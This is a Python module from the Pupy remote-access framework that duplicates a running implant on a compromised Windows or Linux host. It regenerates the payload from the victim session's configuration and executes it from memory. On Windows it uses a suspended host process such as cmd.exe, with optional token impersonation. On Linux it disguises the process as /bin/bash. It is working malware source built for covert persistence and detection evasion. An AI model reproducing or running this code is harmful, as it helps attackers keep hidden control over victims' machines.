# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from modules.lib.windows.memory_exec import exec_pe
from modules.lib.linux.exec_elf import mexec
import pupygen

__class_name__="MemoryDuplicate"

@config(compatibilities=["windows", "linux"], category="manage")
class MemoryDuplicate(PupyModule):
    """
        Duplicate the current pupy payload by executing it from memory
    """
    interactive = 1
    dependencies = {
        'linux': ['memexec'],
        'windows': ['pupwinutils.memexec', 'pupwinutils.processes']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="duplicate", description=cls.__doc__)
        cls.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
        cls.arg_parser.add_argument('-m', '--impersonate', action='store_true', help='use the current impersonated token (to use with impersonate module)')

    def run(self, args):
        #usefull for bind connection
        launcherType, addressPort = self.client.desc['launcher'], self.client.desc['address']
        newClientConf = self.client.get_conf()
        listeningAddressPort =None #For Bind mode
        if self.client.is_windows() and launcherType == "bind":
            listeningPort = -1
            self.info('The current pupy launcher is using a BIND connection on the Windows target.')
            self.info('It is listening on {0} on the target'.format(addressPort))
            self.info('For the duplication, you have to choose another port and it will '
                      'listen on this new specific port on the target')
            self.info("Be careful, you have to choose a port which is not used on the target!")
            self.info("Be careful to firewall configuration/rules on the target too...")
            while listeningPort==-1:
                try:
                    listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                except Exception as e:
                    self.warning("You have to give me a valid port. Try again. ({})".format(e))
            listeningAddress = addressPort.split(':')[0]
            listeningAddressPort = "{0}:{1}".format(listeningAddress, listeningPort)
            self.info("The new pupy instance will listen on {0} on the target".format(listeningAddressPort))
            newClientConf = self.client.get_conf()
            #Modify the listening port on the conf. If it is not modified,
            #the payload will listen on the same port as the inital pupy launcher on the target
            newClientConf['launcher_args'][newClientConf['launcher_args'].index("--port")+1] = str(listeningPort)
            #Delete --oneliner-host argument, not compatible with exe payload
            for pos, val in enumerate(newClientConf['launcher_args']):
                if "--oneliner-host" in val:
                    newClientConf['launcher_args'][pos]=""
                    newClientConf['launcher_args'][pos+1]=""

        self.success("Generating the payload...")
        payload, tpl, _ = pupygen.generate_binary_from_template(
            self.log,
            newClientConf,
            self.client.desc['platform'],
            arch=self.client.arch
        )
        self.success("Payload generated with the current config from {} - size={}".format(tpl, len(payload)))
        self.success("Executing the payload from memory ...")
        if self.client.is_windows():
            exec_pe(
                self, "", raw_pe=payload, interactive=False,
                use_impersonation=args.impersonate, suspended_process=args.process,
                wait=False
            )
        elif self.client.is_linux():
            mexec(self, payload, [], argv0='/bin/bash', raw=True)
        self.success("pupy payload executed from memory")
        if self.client.is_windows() and launcherType == "bind":
            self.success(
                    'You have to connect to the target manually on {0}: '
                    'try "connect --host {0}" in pupy shell'.format(listeningAddressPort))
